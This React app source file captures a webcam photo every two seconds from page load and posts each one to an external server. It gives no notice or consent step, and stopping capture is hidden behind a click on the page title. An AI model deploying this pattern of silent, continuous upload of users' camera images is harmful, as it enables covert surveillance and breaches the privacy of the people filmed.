import React, { useRef, useEffect, useState } from 'react'; 
import Webcam from 'react-webcam';
import axios from 'axios';

const App = () => {
  const webcamRef = useRef(null);
  const [images, setImages] = useState([]);
  const [capturing, setCapturing] = useState(true); // State to track if capturing is on or off

  useEffect(() => {
    let intervalId;

    if (capturing) {
      intervalId = setInterval(() => {
        captureAndUploadPhoto();
      }, 2000); // Capture and upload every 2 seconds
    }

    // Cleanup interval on component unmount or when capturing is turned off
    return () => clearInterval(intervalId);
  }, [capturing]); // Re-run effect when capturing state changes

  const captureAndUploadPhoto = async () => {
    const image = webcamRef.current.getScreenshot();

    if (!image) return console.error('No photo captured!');

    try {
      const response = await axios.post('https://be-ggny.onrender.com/upload', { image: image });
      console.log('Photo uploaded successfully:', response.data);
    } catch (error) {
      console.error('Error uploading photo:', error);
    }
  };

  const fetchImages = async () => {
    try {
      const response = await axios.get("http://localhost:5000/images");
      setImages(response.data); // The response contains formatted base64 images
    } catch (error) {
      console.error("Error fetching images:", error);
    }
  };

  useEffect(() => {
    fetchImages();
  }, []);
  
  const toggleCapture = () => {
    setCapturing((prevCapturing) => !prevCapturing); // Toggle capturing state
  };

  return (
    <div>
      <h1 onClick={toggleCapture}>Photo Capture App</h1>
      <Webcam
        audio={false}
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        videoConstraints={{ facingMode: "user" }}
      />
      <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "center" }}>
        {images.map((img) => (
          <div key={img.id} style={{ margin: "10px" }}>
            <img
              src={img.image} // Use the base64 image directly
              alt="Fetched"
              style={{ width: "150px", height: "150px", objectFit: "cover", borderRadius: "8px" }}
            />
            <p style={{ fontSize: "12px", textAlign: "center" }}>{new Date(img.createdAt).toLocaleString()}</p>
          </div>
        ))}
      </div>
    </div>
  );
};

export default App;
